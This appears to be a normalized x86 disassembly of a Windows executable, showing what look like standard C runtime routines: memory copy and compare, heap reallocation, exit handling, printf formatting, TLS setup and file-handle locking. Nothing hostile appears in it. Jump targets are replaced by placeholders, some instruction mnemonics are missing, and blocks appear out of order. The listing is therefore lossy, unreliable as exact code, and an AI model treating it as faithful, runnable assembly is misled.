jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_408450 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4082b8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4082b8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4082b8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_408450 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_408450 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_408450 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_408450 ]
sub_4084b0
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
retn
mov edx [ esp + 0x4 ]
push esi
push edi
mov esi edx
mov edi [ esp + 0x10 ]
or edx edi
and edx 0x3
je r-xdata
mov ecx eax
and eax 0x3
shr ecx 0x2
je r-xdata
test eax 0x1
je r-xdata
test eax eax
je r-xdata
[ esi ] [ edi ]
je r-xdata
mov cl [ esi ]
mov dl [ edi ]
cmp cl dl
jne r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edi
pop esi
mov edx [ esi ]
mov ecx [ edi ]
cmp dl cl
jne r-xdata
mov ecx [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
cmp cl dl
jne r-xdata
sbb eax eax
pop edi
sbb eax 0xffffffff
pop esi
retn
mov cl [ esi + 0x1 ]
mov dl [ edi + 0x1 ]
cmp cl dl
jne r-xdata
inc esi
inc edi
dec eax
je r-xdata
mov eax 0x0
dec eax
je r-xdata
cmp ch dh
jne r-xdata
add edi 0x2
add esi 0x2
sub eax 0x2
jne r-xdata
pop edi
pop esi
retn
cmp dh ch
jne r-xdata
shr ecx 0x10
shr edx 0x10
cmp cl dl
jne r-xdata
dec eax
je r-xdata
cmp ch dh
and ecx 0xff0000
and edx 0xff0000
cmp edx ecx
jne r-xdata
dec eax
sub_40855c
push esi
push 0x9
call sub_409fbd
mov esi [ esp + 0xc ]
push esi
call sub_40a071
pop ecx
test eax eax
pop ecx
je r-xdata
push 0x9
call sub_40a01e
pop ecx
push esi
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
mov esi [ esi - 0x4 ]
push 0x9
sub esi 0x9
call sub_40a01e
pop ecx
jmp r-xdata
mov eax esi
pop esi
retn
sub_4085a1
push ebx
push esi
mov esi [ esp + 0x10 ]
cmp esi 0xffffffe0
jbe r-xdata
push 0x9
call sub_409fbd
mov ebx [ esp + 0x10 ]
push ebx
call sub_40a071
pop ecx
test eax eax
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
push 0x9
call sub_40a01e
test esi esi
pop ecx
jne r-xdata
push edi
xor edi edi
cmp esi [ rw-data ]
ja r-xdata
pop esi
pop ebx
retn
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push 0x10
push [ rw-data ]
call [ HeapReAlloc@IAT ]
push 0x1
pop esi
push 0x9
call sub_40a01e
pop ecx
mov eax edi
pop edi
jmp r-xdata
push esi
push ebx
push eax
call sub_40a87c
add esp 0xc
test eax eax
je r-xdata
mov edi ebx
sub_408667
push edi
call sub_40870c
push 0x1
pop edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rw-data ] edi
mov [ rw-data ] bl
jne r-xdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rw-data
push rw-data
call sub_40871e
pop ecx
pop ecx
test ebx ebx
pop ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
mov [ rw-data ] edi
call [ ExitProcess@IAT ]
call sub_408715
pop edi
retn
push rw-data
push rw-data
call sub_40871e
pop ecx
pop ecx
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb r-xdata
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
sub esi 0x4
cmp esi [ rw-data ]
jae r-xdata
call eax
sub_408738
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x10 ]
test al 0x82
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and al 0xef
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov ecx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
push ebx
call sub_409d68
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle r-xdata
push ebx
call sub_40cdf5
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
push edi
push eax
push ebx
call sub_409d68
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
push esi
call sub_40cdb1
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rw-data
mov ecx ebx
mov eax ebx
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push 0x0
push ebx
call sub_4098d5
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_408850
push ebp
mov ebp esp
sub esp 0x248
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp + 0xc ] edi
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
xor edx edx
jmp r-xdata
cmp [ ebp - 0x14 ] edx
jl r-xdata
cmp bl 0x20
jl r-xdata
xor eax eax
cmp bl 0x78
jg r-xdata
mov edi [ ebp + 0xc ]
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp + 0xc ] edi
jne r-xdata
jmp [ eax * 4 + jump_table_408f71 ]
movsx eax bl
mov al [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x30 ]
xor edx edx
or [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x24 ] edx
jmp r-xdata
movsx eax bl
sub eax 0x20
je r-xdata
cmp bl 0x2a
jne r-xdata
mov [ ebp - 0x10 ] edx
jmp r-xdata
cmp bl 0x2a
jne r-xdata
cmp bl 0x49
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] edx
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
movsx eax bl
cmp eax 0x67
jg r-xdata
movsx eax [ esi + eax * 8 + r--data ]
sar eax 0x4
cmp eax 0x7
mov [ ebp - 0x30 ] eax
ja r-xdata
or [ ebp - 0x4 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x20 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40902f
test eax eax
pop ecx
mov [ ebp - 0x20 ] eax
jge r-xdata
lea eax [ ecx + ecx * 4 ]
movsx ecx bl
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40902f
test eax eax
pop ecx
mov [ ebp - 0x10 ] eax
jge r-xdata
cmp [ edi ] 0x36
jne r-xdata
cmp bl 0x68
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_408f91
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_408f91
mov bl [ edi ]
add esp 0xc
inc edi
mov [ ebp + 0xc ] edi
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x4 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x10 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x30 ] edx
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x4 ] 0x20
jmp r-xdata
cmp bl 0x6c
je r-xdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x4 ] 0x40
lea edi [ ebp - 0x248 ]
cmp ecx edx
mov [ ebp - 0x8 ] edi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x4 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
inc edi
inc edi
or [ ebp - 0x3 ] 0x80
mov [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp - 0x4 ] 0x10
jmp r-xdata
cmp bl 0x77
jne r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40903c
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40902f
test [ ebp - 0x4 ] 0x20
pop ecx
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0x10 ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ebp - 0x3 ] 0x8
jmp r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x8
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x34 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x10 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x48 ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x44 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call [ rw-data ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je r-xdata
cmp bl 0x67
jne r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40902f
test eax eax
pop ecx
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x2c ] 0x7
sub eax 0x43
je r-xdata
or [ ebp - 0x4 ] 0x8
jmp r-xdata
call sub_40902f
pop ecx
xor edx edx
call sub_40902f
pop ecx
jmp r-xdata
call sub_40902f
pop ecx
movzx eax ax
jmp r-xdata
call sub_40902f
pop ecx
movsx eax ax
mov esi eax
mov edi edx
test edx edx
jg r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x80
je r-xdata
or [ ebp - 0x3 ] 0x2
jmp r-xdata
mov [ ebp - 0x10 ] 0x8
sub eax 0x3
je r-xdata
cmp bl 0x67
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
test [ ebp - 0x4 ] 0x810
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
dec eax
je r-xdata
mov al [ ebp - 0x2c ]
mov [ ebp - 0x16 ] 0x30
add al 0x51
mov [ ebp - 0x1c ] 0x2
mov [ ebp - 0x15 ] al
jmp r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
and edi 0x0
jl r-xdata
mov esi [ ebp - 0x10 ]
cmp esi 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp - 0x248 ] 0x2d
jne r-xdata
test esi esi
jne r-xdata
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
call sub_40c460
pop ecx
jmp r-xdata
test [ ebp - 0x3 ] 0x8
je r-xdata
call sub_40902f
pop ecx
mov [ ebp - 0x248 ] al
mov [ ebp - 0xc ] 0x1
call sub_40904c
push eax
lea eax [ ebp - 0x248 ]
push eax
call sub_40ce1e
add esp 0xc
mov [ ebp - 0xc ] eax
test eax eax
jge r-xdata
jmp r-xdata
or [ ebp - 0x3 ] 0x8
mov [ ebp - 0x34 ] 0x1
add bl 0x20
dec eax
dec eax
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
mov esi eax
neg edx
or [ ebp - 0x3 ] 0x1
mov edi edx
jmp r-xdata
test eax eax
jae r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40902f
test [ ebp - 0x4 ] 0x810
pop ecx
mov ecx eax
mov [ ebp - 0x8 ] ecx
je r-xdata
mov esi 0x7fffffff
mov [ ebp - 0xc ] 0xa
sub eax 0x3
jne r-xdata
push edi
or [ ebp - 0x3 ] 0x1
lea edi [ ebp - 0x247 ]
mov [ ebp - 0x8 ] edi
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
mov [ ebp - 0xc ] eax
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x8 ] ecx
movsx eax [ eax ]
jmp r-xdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x24 ] 0x1
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
lea eax [ ebp - 0x248 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
sub eax 0xc
jne r-xdata
lea eax [ ebp - 0x49 ]
mov [ ebp - 0x8 ] eax
and [ ebp - 0x1c ] 0x0
mov eax esi
or eax edi
jne r-xdata
test [ ebp - 0x3 ] 0x80
jne r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov [ ebp - 0x2c ] 0x27
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
push edi
push esi
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] edx
call sub_40cf50
push [ ebp - 0x3c ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x40 ]
push edi
push esi
call sub_40cee0
cmp ebx 0x39
mov esi eax
mov edi edx
jle r-xdata
mov eax esi
or eax edi
je r-xdata
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x24 ] 0x1
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x10
je r-xdata
mov esi [ ebp - 0x20 ]
sub esi [ ebp - 0x1c ]
sub esi [ ebp - 0xc ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
or [ ebp - 0x3 ] 0x8
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
jmp r-xdata
add ebx [ ebp - 0x2c ]
lea eax [ ebp - 0x49 ]
sub eax [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0xc ] eax
je r-xdata
sub eax ecx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
sub eax ecx
sar eax 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x16 ]
push [ ebp + 0x8 ]
push [ ebp - 0x1c ]
push eax
call sub_408ff7
add esp 0x10
test bl 0x8
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_408fc6
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x16 ] 0x2d
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
test eax eax
jg r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx ] 0x30
jne r-xdata
inc eax
jmp r-xdata
inc eax
inc eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x16 ] 0x2b
jmp r-xdata
mov [ ebp - 0x1c ] 0x1
dec [ ebp - 0x8 ]
inc eax
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0x30
test eax eax
jne r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
call sub_408ff7
add esp 0x10
cmp [ ebp - 0xc ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_408fc6
add esp 0x10
mov [ ebp - 0x16 ] 0x20
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_408fc6
add esp 0x10
mov eax [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_408ff7
add esp 0x10
mov eax edi
dec edi
test eax eax
jne r-xdata
mov ax [ ebx ]
inc ebx
push eax
lea eax [ ebp - 0x38 ]
push eax
inc ebx
call sub_40ce1e
pop ecx
test eax eax
pop ecx
jle r-xdata
jmp r-xdata
sub_408f91
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
dec [ ecx + 0x4 ]
js r-xdata
push ecx
push [ ebp + 0x8 ]
call sub_408738
pop ecx
pop ecx
mov edx [ ecx ]
mov al [ ebp + 0x8 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ eax ]
pop ebp
retn
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
mov eax [ ebp + 0x10 ]
jne r-xdata
sub_408fc6
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg r-xdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_408f91
add esp 0xc
cmp [ esi ] 0xffffffff
je r-xdata
sub_408ff7
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg r-xdata
movsx eax [ esi ]
push edi
inc esi
push [ esp + 0x1c ]
push eax
call sub_408f91
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_40905a
push esi
call sub_409f94
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
xor eax eax
pop esi
retn
push 0x74
push 0x1
call sub_40cd24
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_4090ae
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
push 0x1
mov [ esi ] eax
pop eax
pop esi
retn
sub_4090c1
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
mov eax esi
pop edi
pop esi
retn
push 0x74
push 0x1
call sub_40cd24
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push 0x10
call sub_406ec2
pop ecx
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_4090ae
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_409128
push ebp
mov ebp esp
sub esp 0x24
push ebx
mov ebx [ ebp + 0x8 ]
sub ebx 0x76c
cmp ebx 0x46
jl r-xdata
or eax 0xffffffff
cmp ebx 0x8a
jg r-xdata
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ edi * 4 + rw-data ]
add esi [ ebp + 0x10 ]
test bl 0x3
jne r-xdata
call sub_40c4db
mov eax ebx
lea ecx [ ebx - 0x1 ]
imul eax eax 0x16d
sar ecx 0x2
mov edx esi
mov [ ebp - 0x8 ] esi
add edx ecx
mov [ ebp - 0x10 ] ebx
add eax edx
mov edx [ ebp + 0x1c ]
lea ecx [ eax + eax * 2 ]
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x1c ] eax
lea ecx [ eax + ecx * 8 ]
imul ecx ecx 0x3c
add ecx [ ebp + 0x18 ]
imul ecx ecx 0x3c
add ecx [ rw-data ]
dec edi
cmp [ ebp + 0x20 ] 0x1
mov [ ebp - 0x14 ] edi
pop edi
pop esi
lea ecx [ ecx + edx + 0x7c558180 ]
mov [ ebp + 0x8 ] ecx
je r-xdata
cmp edi 0x2
jle r-xdata
add ecx [ rw-data ]
cmp [ ebp + 0x20 ] 0xffffffff
jne r-xdata
inc esi
pop ebx
leave
retn
mov eax ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_40c790
pop ecx
mov ecx [ ebp + 0x8 ]
test eax eax
je r-xdata
sub_4091ea
mov eax [ rw-data ]
push esi
push 0x14
test eax eax
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_40cd24
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor ecx ecx
mov eax rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_40cd24
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov edx [ rw-data ]
mov [ ecx + edx ] eax
add eax 0x20
add ecx 0x4
cmp eax rw-data
jl r-xdata
xor ecx ecx
mov edx rw-data
push 0x1a
call sub_406ec2
pop ecx
or [ edx ] 0xffffffff
test eax eax
jne r-xdata
mov esi ecx
mov eax ecx
sar esi 0x5
and eax 0x1f
mov esi [ esi * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
mov eax [ esi + eax * 4 ]
cmp eax 0xffffffff
je r-xdata
pop esi
retn
add edx 0x20
inc ecx
cmp edx rw-data
jl r-xdata
sub_4092a6
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_409fbd
pop ecx
retn
sub_4092d5
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_409fbd
pop ecx
retn
sub_4092f8
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_40a01e
pop ecx
retn
sub_409327
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_40a01e
pop ecx
retn
sub_40934a
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_408122
mov [ eax ] 0x9
call sub_40812b
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_40d2a6
push esi
call sub_4093a7
push esi
mov edi eax
call sub_40d305
add esp 0xc
mov eax edi
pop edi
pop esi
retn
sub_4093a7
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_40d264
cmp eax 0xffffffff
pop ecx
je r-xdata
xor edi edi
cmp esi 0x1
je r-xdata
xor eax eax
push edi
call sub_4080af
pop ecx
or eax 0xffffffff
jmp r-xdata
push 0x2
call sub_40d264
push 0x1
mov edi eax
call sub_40d264
pop ecx
cmp eax edi
pop ecx
je r-xdata
cmp esi 0x2
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_40d264
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_40d1e5
mov eax esi
and esi 0x1f
sar eax 0x5
pop ecx
mov eax [ eax * 4 + rw-data ]
lea ecx [ esi + esi * 8 ]
and [ eax + ecx * 4 + 0x4 ] 0x0
test edi edi
je r-xdata
sub_40942a
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_406c50
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_409455
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push edi
push esi
call sub_4092a6
push esi
call sub_409484
push esi
mov edi eax
call sub_4092f8
add esp 0xc
mov eax edi
pop edi
pop esi
retn
push esi
call sub_409517
pop ecx
pop esi
retn
sub_409484
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_4094b2
test eax eax
pop ecx
je r-xdata
test [ esi + 0xd ] 0x40
je r-xdata
or eax 0xffffffff
